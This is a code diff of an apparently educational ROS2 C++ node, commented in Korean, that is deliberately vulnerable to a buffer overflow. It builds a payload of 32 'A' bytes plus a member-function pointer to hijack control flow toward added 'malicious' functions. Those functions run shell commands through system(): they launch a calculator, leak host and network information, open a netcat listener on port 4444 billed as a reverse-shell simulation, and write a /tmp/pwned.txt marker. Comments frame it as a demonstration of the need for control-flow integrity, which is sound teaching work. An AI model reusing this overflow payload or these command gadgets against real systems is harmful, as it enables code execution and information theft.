@@ -56,6 +56,17 @@ public:
     std::cout << "정상 메시지: ros2 topic pub /vulnerable_topic std_msgs/msg/String \"data: 'Hello'\"" << std::endl;
     std::cout << "공격 메시지: ros2 topic pub /vulnerable_topic std_msgs/msg/String \"data: '" << 
                  create_attack_payload() << "'\"" << std::endl;
+    std::cout << "\n=== 공격 가능한 함수 주소들 ===" << std::endl;
+    std::cout << "execute_calculator 주소: " << std::hex << 
+		     reinterpret_cast<void*>(&VulnerableSubscriber::execute_calculator) << std::endl;
+    std::cout << "leak_system_info 주소: " << std::hex << 
+		     reinterpret_cast<void*>(&VulnerableSubscriber::leak_system_info) << std::endl;
+    std::cout << "spawn_reverse_shell 주소: " << std::hex << 
+		     reinterpret_cast<void*>(&VulnerableSubscriber::spawn_reverse_shell) << std::endl;
+    std::cout << "create_pwned_file 주소: " << std::hex << 
+		     reinterpret_cast<void*>(&VulnerableSubscriber::create_pwned_file) << std::endl;
+		std::cout << "malicious_function 주소: " << std::hex << 
+		     reinterpret_cast<void*>(&VulnerableSubscriber::malicious_function) << std::endl;
   }
 
 private:
@@ -152,31 +163,26 @@ private:
   }
   
   // 공격 페이로드를 생성하는 헬퍼 함수
-  std::string create_attack_payload()
-  {
-    // 함수 포인터를 악성 함수의 주소로 덮어쓰는 페이로드를 생성합니다.
-    // ROS2 String 메시지의 제약으로 인해 16진 문자열 형태로 생성합니다.
-    
-    std::string payload = "HEX:";
-    
-    // 먼저 버퍼를 가득 채웁니다 (32바이트를 16진 문자열로)
-    for (int i = 0; i < 32; ++i) {
-      payload += "41"; // 'A'의 ASCII 값인 0x41
-    }
-    
-    // 그 다음 악성 함수의 주소를 16진 문자열로 추가합니다.
-    void (VulnerableSubscriber::*malicious_ptr)() = &VulnerableSubscriber::malicious_function;
-    const unsigned char* ptr_bytes = reinterpret_cast<const unsigned char*>(&malicious_ptr);
-    
-    // 포인터를 바이트별로 16진 문자열로 변환합니다
-    for (size_t i = 0; i < sizeof(malicious_ptr); ++i) {
-      char hex_byte[3];
-      sprintf(hex_byte, "%02x", ptr_bytes[i]);
-      payload += hex_byte;
-    }
-    
-    return payload;
-  }
+	std::string create_attack_payload()
+	{
+		  std::string payload = "HEX:";
+		  
+		  // 버퍼를 가득 채웁니다 (32바이트)
+		  for (int i = 0; i < 32; ++i) {
+		      payload += "41"; // 'A'
+		  }
+		  
+		  void (VulnerableSubscriber::*malicious_ptr)() = &VulnerableSubscriber::malicious_function;
+      const unsigned char* ptr_bytes = reinterpret_cast<const unsigned char*>(&malicious_ptr);
+		  
+		  for (size_t i = 0; i < sizeof(malicious_ptr); ++i) {
+		      char hex_byte[3];
+		      sprintf(hex_byte, "%02x", ptr_bytes[i]);
+		      payload += hex_byte;
+		  }
+		  
+		  return payload;
+	}
   
   // 16진 문자열을 바이너리 데이터로 변환하는 헬퍼 함수
   std::string hex_string_to_binary(const std::string& hex_str)
@@ -196,6 +202,52 @@ private:
     std::cout << "16진 변환 결과: " << binary_data.length() << " bytes 생성됨" << std::endl;
     return binary_data;
   }
+  
+  // 계산기를 실행하는 함수
+  void execute_calculator()
+  {
+    std::cout << "🚨 공격 성공! 계산기를 실행합니다..." << std::endl;
+    int result = system("gnome-calculator &");
+    if (result == 0) {
+      std::cout << "✓ 계산기 실행 성공!" << std::endl;
+    }
+    RCLCPP_ERROR(this->get_logger(), "시스템 명령이 실행되었습니다! CFI가 절실히 필요합니다!");
+  }
+  
+  // 시스템 정보를 유출하는 함수
+  void leak_system_info()
+  {
+    std::cout << "🚨 공격 성공! 시스템 정보를 유출합니다..." << std::endl;
+    std::cout << "=== 시스템 정보 ===" << std::endl;
+    system("uname -a");
+    system("whoami");
+    system("pwd");
+    std::cout << "=== 네트워크 정보 ===" << std::endl;
+    system("ip addr | grep inet");
+    RCLCPP_ERROR(this->get_logger(), "민감한 정보가 유출되었습니다!");
+  }
+  
+  // 리버스 쉘을 실행하는 함수 (교육 목적 - 실제로는 로컬호스트로만)
+  void spawn_reverse_shell()
+  {
+    std::cout << "🚨 공격 성공! 리버스 쉘을 시뮬레이션합니다..." << std::endl;
+    std::cout << "실제 공격에서는 여기서 공격자의 서버로 연결이 생성됩니다." << std::endl;
+    // 안전을 위해 실제 리버스 쉘 대신 시뮬레이션만 수행
+    system("echo '리버스 쉘이 연결되었습니다!' | nc -l 4444 &");
+    std::cout << "포트 4444에서 대기 중... (nc localhost 4444로 연결 가능)" << std::endl;
+  }
+  
+  // 파일을 생성하는 함수 (공격 성공의 증거)
+  void create_pwned_file()
+  {
+    std::cout << "🚨 공격 성공! 시스템이 손상되었음을 표시합니다..." << std::endl;
+    system("echo 'This system has been pwned!' > /tmp/pwned.txt");
+    system("echo '공격 시간: ' >> /tmp/pwned.txt");
+    system("date >> /tmp/pwned.txt");
+    system("cat /tmp/pwned.txt");
+    RCLCPP_ERROR(this->get_logger(), "공격의 흔적이 /tmp/pwned.txt에 기록되었습니다!");
+  }
+  
 };
 
 int main(int argc, char* argv[])
